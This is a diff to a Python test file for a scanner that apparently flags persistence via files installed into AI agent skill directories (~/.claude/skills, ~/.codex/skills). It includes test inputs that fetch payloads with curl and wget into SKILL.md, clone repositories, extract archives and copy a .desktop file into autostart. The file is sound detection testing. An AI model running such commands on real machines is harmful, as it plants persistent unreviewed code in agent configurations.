@@ -131,19 +131,101 @@ def test_install_directory_copy_to_unrelated_target_is_not_persistence():
     assert not any(f.rule_id == "RA2" for f in findings)
 
 
-def test_install_directory_copy_to_different_skill_is_not_persistence():
+def test_install_directory_copy_to_different_skill_is_persistence():
     findings = _scan(
         "mkdir -p ~/.claude/skills/payload\ncp -r /tmp/payload ~/.claude/skills/another-skill\n"
     )
 
-    assert not any(f.rule_id == "RA2" for f in findings)
+    assert any(f.rule_id == "RA2" and f.start_line == 2 for f in findings)
 
 
-def test_install_directory_does_not_match_copy_in_a_later_paragraph():
+def test_install_directory_copy_in_a_later_paragraph_is_persistence():
     findings = _scan(
         "mkdir -p ~/.claude/skills/payload\n\ncp -r /tmp/payload ~/.claude/skills/payload\n"
     )
 
+    assert any(f.rule_id == "RA2" and f.start_line == 3 for f in findings)
+
+
+@pytest.mark.parametrize("separator", ["\n", "\r\n", "\r", "\u2028", "\u2029"])
+@pytest.mark.parametrize(
+    "operation",
+    [
+        "cp -r ./payload ~/.claude/skills/helper # install",
+        "cp -r ./payload ~/.claude/skills/helper && echo done",
+        "cp -r ./payload ~/.claude/skills/helper > install.log",
+        "cp -r ./payload '~/.claude/skills/helper",
+        "tar -xzf helper.tgz -C ~/.claude/skills/helper",
+        "rsync -a ./payload/ ~/.claude/skills/helper/",
+        "curl https://example.test/payload -o ~/.claude/skills/helper/SKILL.md",
+        "wget -O ~/.claude/skills/helper/SKILL.md https://example.test/payload",
+        "unzip helper.zip -d ~/.claude/skills/helper",
+        "ln -s ./payload ~/.claude/skills/helper",
+        "cp -r ./payload $HOME/.claude/skills/helper",
+        "cp -r ./payload ${HOME}/.claude/skills/helper",
+        "cp -r ./payload /home/alice/.claude/skills/helper",
+        "cp -r ./payload ~/.codex/skills/another-skill",
+        "git clone https://example.test/repo.git ~/.claude/skills/other",
+        "git clone https://example.test/repo.git ~/.claude/skills/helper && echo done",
+        "git clone https://example.test/repo.git ~/.claude/skills/helper/../other",
+    ],
+)
+@pytest.mark.parametrize("position", ["before", "after"])
+def test_other_skills_root_reference_across_blank_line_is_conservative(
+    separator, operation, position
+):
+    mkdir = "mkdir -p ~/.claude/skills/helper"
+    content = separator.join(
+        [mkdir, "", operation] if position == "after" else [operation, "", mkdir]
+    )
+    findings = rogue.analyze(content, "README.md", "markdown")
+    expected_line = 3 if position == "after" else 1
+    persistence = [f for f in findings if f.rule_id == "RA2"]
+    assert persistence
+    assert any(
+        f.location.start_line == expected_line and f.matched_text in operation for f in persistence
+    )
+
+
+@pytest.mark.parametrize(
+    "destination",
+    [
+        "~/.claude/skills/helper",
+        "$HOME/.claude/skills/helper",
+        "${HOME}/.claude/skills/helper/sub-skill",
+        "/home/alice/.claude/skills/helper",
+    ],
+)
+def test_only_simple_clone_under_created_directory_is_exempt(destination):
+    content = (
+        "mkdir -p ~/.claude/skills/helper\n\n"
+        f"git clone https://example.test/helper.git {destination}\n"
+    )
+    assert not any(f.rule_id == "RA2" for f in _scan(content))
+
+
+def test_clipped_adjacent_line_keeps_mkdir_evidence():
+    content = "mkdir -p ~/.claude/skills/helper\n" + "x" * 4096 + " ~/.claude/skills/helper"
+    findings = rogue.analyze(content, "README.md", "markdown")
+    assert any(f.rule_id == "RA2" and f.location.start_line == 1 for f in findings)
+
+
+def test_extra_benign_lines_do_not_hide_skills_root_use_inside_context_window():
+    content = (
+        "mkdir -p ~/.claude/skills/helper\n"
+        + "echo preparing\n" * 8
+        + "\ncp ./payload ~/.claude/skills/helper/SKILL.md\n"
+    )
+    findings = rogue.analyze(content, "README.md", "markdown")
+    assert any(f.rule_id == "RA2" and f.location.start_line == 11 for f in findings)
+
+
+def test_generic_hidden_directory_pattern_stops_at_shell_composition():
+    findings = rogue.analyze(
+        "mkdir -p build && cp agent.desktop ~/.config/autostart/",
+        "README.md",
+        "markdown",
+    )
     assert not any(f.rule_id == "RA2" for f in findings)
 
 
